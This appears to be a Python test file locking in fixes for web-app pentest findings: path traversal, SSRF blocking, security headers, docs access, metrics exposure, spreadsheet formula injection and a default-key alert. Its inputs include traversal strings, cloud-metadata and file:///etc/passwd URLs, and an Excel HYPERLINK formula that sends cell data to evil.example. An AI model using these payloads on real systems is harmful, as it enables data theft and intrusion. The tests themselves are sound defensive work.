"""Pentest findings, each locked by a test so it cannot come back."""
import os

from app import main as main_mod


def test_the_spa_fallback_never_serves_a_file_outside_the_static_folder(client, tmp_path, monkeypatch):
    # A built SPA folder with its index, and a secret file right next to it.
    static = tmp_path / "static"
    static.mkdir()
    (static / "index.html").write_text("<html>spa</html>", encoding="utf-8")
    (static / "app.js").write_text("console.log(1)", encoding="utf-8")
    (tmp_path / "secret.txt").write_text("TOP-SECRET", encoding="utf-8")
    monkeypatch.setattr(main_mod, "STATIC_DIR", str(static))

    assert client.get("/app.js").text == "console.log(1)"       # a real asset still served
    secret = str(tmp_path / "secret.txt").replace("\\", "/")
    for path in ("/../secret.txt", "/..%2fsecret.txt", "/%2e%2e/secret.txt", "/%2e%2e%2fsecret.txt",
                 "/" + secret, "//" + secret.lstrip("/"), "/..\\secret.txt"):
        r = client.get(path)
        assert "TOP-SECRET" not in r.text, path


def test_outbound_fetches_never_reach_the_cloud_metadata_service():
    import pytest
    from app.netguard import BlockedURL, check_outbound_url
    for bad in ("http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "gopher://x", "http://[fe80::1]/"):
        with pytest.raises(BlockedURL):
            check_outbound_url(bad)
    check_outbound_url("https://login.example.com/.well-known/openid-configuration")
    check_outbound_url("http://localhost:8080/realms/x")  # a local IdP stays allowed


def test_the_sso_test_refuses_an_issuer_on_the_metadata_address():
    from app.ssotest import test_oidc
    res = test_oidc({"oidc_issuer_url": "http://169.254.169.254", "oidc_client_id": "x"})
    assert "169.254.169.254" in str(res) and "refus" in str(res).lower()


def test_security_headers_on_every_response(client):
    r = client.get("/api/health")
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "SAMEORIGIN"
    assert "frame-ancestors 'self'" in r.headers["Content-Security-Policy"]
    assert r.headers["Cache-Control"] == "no-store"
    assert "Referrer-Policy" in r.headers and "Strict-Transport-Security" in r.headers


def test_the_api_documentation_is_for_administrators_only(client, seeded):
    from tests.conftest import login
    for path in ("/docs", "/redoc", "/openapi.json"):
        assert client.get(path).status_code == 401, path
    login(client, seeded["member"])
    assert client.get("/openapi.json").status_code == 403
    login(client, seeded["admin"])
    assert client.get("/openapi.json").status_code == 200
    assert "swagger" in client.get("/docs").text.lower()


def test_metrics_without_a_token_are_not_served_through_a_proxy(client, monkeypatch):
    from app.config import settings
    monkeypatch.setattr(settings, "metrics_enabled", True)
    monkeypatch.setattr(settings, "metrics_token", "")
    assert client.get("/metrics", headers={"X-Forwarded-For": "203.0.113.9"}).status_code == 404


def test_a_generated_workbook_never_carries_a_formula_typed_in_a_name():
    """A platform or KPI named "=HYPERLINK(...)" stays text in the Steerco template
    (it ran in Excel on the reader's machine), and reads back identical."""
    import io
    from openpyxl import load_workbook
    from app.steerco_import import template_bytes
    evil = '=HYPERLINK("http://evil.example/?"&B2,"x")'
    wb = load_workbook(io.BytesIO(template_bytes("2026-07", [evil, "=1+1"], [], evil)))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]
    assert not [c for c in cells if c.data_type == "f"]
    assert any(c.value == evil for c in cells)


def test_administrators_are_alerted_while_the_secret_key_is_the_default(client, seeded, monkeypatch):
    from app.config import settings
    from tests.conftest import login
    monkeypatch.setattr(settings, "secret_key", "change-me-in-prod-please-32chars-min-secret")
    login(client, seeded["admin"])
    assert client.get("/api/auth/me/permissions").json()["security_alerts"] == ["secret_key"]
    login(client, seeded["member"])
    assert "security_alerts" not in client.get("/api/auth/me/permissions").json()
    monkeypatch.setattr(settings, "secret_key", "x" * 48)
    login(client, seeded["admin"])
    assert client.get("/api/auth/me/permissions").json()["security_alerts"] == []
